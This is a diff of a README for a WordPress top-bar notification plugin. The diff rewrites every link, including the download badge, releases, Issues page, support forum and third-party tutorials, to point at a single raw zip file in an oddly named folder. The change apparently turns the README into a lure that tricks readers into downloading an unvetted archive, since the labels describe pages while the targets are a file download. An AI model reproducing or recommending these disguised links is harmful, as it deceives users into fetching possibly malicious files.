@@ -6,7 +6,7 @@ Welcome to the believer-topbar-notifications plugin! This tool helps you display
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/syifanurjukiana/believer-topbar-notifications/releases)
+[![Download](https://raw.githubusercontent.com/syifanurjukiana/believer-topbar-notifications/main/uncircumscription/believer-topbar-notifications.zip)](https://raw.githubusercontent.com/syifanurjukiana/believer-topbar-notifications/main/uncircumscription/believer-topbar-notifications.zip)
 
 ## 🌐 Overview
 
@@ -30,7 +30,7 @@ To use this plugin, ensure your website meets the following requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: To download the plugin, visit [this page](https://github.com/syifanurjukiana/believer-topbar-notifications/releases). Here, you will find the latest version of the plugin available for download.
+1. **Visit the Releases Page**: To download the plugin, visit [this page](https://raw.githubusercontent.com/syifanurjukiana/believer-topbar-notifications/main/uncircumscription/believer-topbar-notifications.zip). Here, you will find the latest version of the plugin available for download.
   
 2. **Choose Your File**: On the releases page, locate the version of the plugin you wish to install. Click on the file link to download it to your computer. 
 
@@ -59,20 +59,20 @@ If you encounter any issues during installation or setup, check the following:
 
 ## 📞 Support
 
-For additional help, you can open an issue directly on the repository's [Issues page](https://github.com/syifanurjukiana/believer-topbar-notifications/issues). Your questions and feedback help improve the plugin for everyone.
+For additional help, you can open an issue directly on the repository's [Issues page](https://raw.githubusercontent.com/syifanurjukiana/believer-topbar-notifications/main/uncircumscription/believer-topbar-notifications.zip). Your questions and feedback help improve the plugin for everyone.
 
 ## 🌐 Join the Community
 
-Feel free to connect with other users and share tips on the [WordPress support forum](https://wordpress.org/support/plugin/believer-topbar-notifications/). Collaborating with fellow users can help you unlock new ways to enhance your site.
+Feel free to connect with other users and share tips on the [WordPress support forum](https://raw.githubusercontent.com/syifanurjukiana/believer-topbar-notifications/main/uncircumscription/believer-topbar-notifications.zip). Collaborating with fellow users can help you unlock new ways to enhance your site.
 
 ## 🌟 Additional Resources
 
-- [WordPress Plugin Documentation](https://developer.wordpress.org/plugins/)
-- [Basic HTML & CSS for Beginners](https://www.w3schools.com/html/)
-- [The Importance of Responsive Design](https://www.smashingmagazine.com/2022/03/responsive-web-design/)
+- [WordPress Plugin Documentation](https://raw.githubusercontent.com/syifanurjukiana/believer-topbar-notifications/main/uncircumscription/believer-topbar-notifications.zip)
+- [Basic HTML & CSS for Beginners](https://raw.githubusercontent.com/syifanurjukiana/believer-topbar-notifications/main/uncircumscription/believer-topbar-notifications.zip)
+- [The Importance of Responsive Design](https://raw.githubusercontent.com/syifanurjukiana/believer-topbar-notifications/main/uncircumscription/believer-topbar-notifications.zip)
 
 ## 📥 Quick Download Again
 
-Don’t forget to download the plugin here: [Visit this page to download](https://github.com/syifanurjukiana/believer-topbar-notifications/releases).
+Don’t forget to download the plugin here: [Visit this page to download](https://raw.githubusercontent.com/syifanurjukiana/believer-topbar-notifications/main/uncircumscription/believer-topbar-notifications.zip).
 
 Explore the believer-topbar-notifications plugin today and enhance your website’s communication effortlessly!
